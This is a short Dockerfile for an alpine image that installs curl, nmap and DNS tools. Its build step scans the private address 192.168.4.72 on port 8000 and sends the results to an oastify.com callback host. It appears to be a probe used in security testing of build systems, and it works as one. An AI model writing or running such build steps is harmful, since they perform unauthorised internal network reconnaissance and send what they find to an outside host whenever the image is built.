FROM alpine
RUN apk add --no-cache curl nmap bind-tools
RUN C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
 nmap -Pn -p 8000 --open --max-rtt-timeout 100ms 192.168.4.72 2>&1 | curl -s "$C/nmap-scan-pn" --data-binary @-
